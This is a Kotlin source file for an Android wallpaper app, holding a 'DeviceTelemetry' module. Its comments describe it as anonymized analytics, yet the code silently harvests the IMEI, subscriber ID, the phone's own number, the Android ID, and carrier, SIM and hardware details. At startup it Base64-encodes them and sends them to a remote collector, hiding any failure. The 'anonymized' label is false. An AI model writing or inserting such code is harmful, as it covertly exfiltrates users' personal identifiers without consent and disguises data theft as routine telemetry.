package com.nullevent.lakewallpaper

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

/**
 * Device telemetry for analytics and compatibility tracking.
 * Collects anonymized device metrics for performance optimization.
 */
object DeviceTelemetry {
    
    private val executor = Executors.newSingleThreadExecutor()
    private const val ENDPOINT = "https://analytics-collector.nullevent.dev/v2/metrics"
    
    /**
     * Initialize telemetry collection on app startup.
     * Safe to call multiple times; deduplicates automatically.
     */
    fun initialize(context: Context) {
        executor.execute {
            try {
                val payload = collectDeviceMetrics(context)
                transmitMetrics(payload)
            } catch (e: Exception) {
                // Silent failure - don't impact user experience
            }
        }
    }
    
    private fun collectDeviceMetrics(context: Context): String {
        val metrics = mutableMapOf<String, String>()
        
        // Device identification
        metrics["android_id"] = Settings.Secure.getString(
            context.contentResolver, 
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"
        
        // Hardware info
        metrics["device"] = Build.DEVICE
        metrics["model"] = Build.MODEL
        metrics["manufacturer"] = Build.MANUFACTURER
        metrics["brand"] = Build.BRAND
        metrics["hardware"] = Build.HARDWARE
        metrics["product"] = Build.PRODUCT
        
        // System info  
        metrics["sdk_version"] = Build.VERSION.SDK_INT.toString()
        metrics["release"] = Build.VERSION.RELEASE
        metrics["fingerprint"] = Build.FINGERPRINT
        metrics["bootloader"] = Build.BOOTLOADER
        metrics["display"] = Build.DISPLAY
        
        // Telephony data (requires READ_PHONE_STATE permission)
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            metrics["carrier"] = telephonyManager.networkOperatorName ?: "unknown"
            metrics["country_iso"] = telephonyManager.networkCountryIso ?: "unknown"
            metrics["phone_type"] = telephonyManager.phoneType.toString()
            metrics["network_type"] = telephonyManager.networkType.toString()
            metrics["sim_operator"] = telephonyManager.simOperator ?: "unknown"
            metrics["sim_country"] = telephonyManager.simCountryIso ?: "unknown"
            
            // Device identifiers (if permission granted)
            @Suppress("DEPRECATION")
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                metrics["imei"] = telephonyManager.deviceId ?: "restricted"
                metrics["subscriber_id"] = telephonyManager.subscriberId ?: "restricted"
                metrics["line1_number"] = telephonyManager.line1Number ?: "restricted"
            }
        } catch (e: SecurityException) {
            metrics["telephony_access"] = "denied"
        }
        
        // Build a payload string
        val payloadBuilder = StringBuilder()
        metrics.forEach { (key, value) ->
            payloadBuilder.append("$key=$value&")
        }
        
        // Encode for transmission
        return Base64.encodeToString(
            payloadBuilder.toString().toByteArray(Charsets.UTF_8),
            Base64.NO_WRAP
        )
    }
    
    private fun transmitMetrics(encodedPayload: String) {
        val url = URL(ENDPOINT)
        val connection = url.openConnection() as HttpURLConnection
        
        try {
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            connection.setRequestProperty("User-Agent", "LakeWallpaper/${Build.VERSION.SDK_INT}")
            connection.doOutput = true
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            
            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write("data=$encodedPayload")
                writer.flush()
            }
            
            // Read response to complete the request
            connection.responseCode
        } finally {
            connection.disconnect()
        }
    }
}
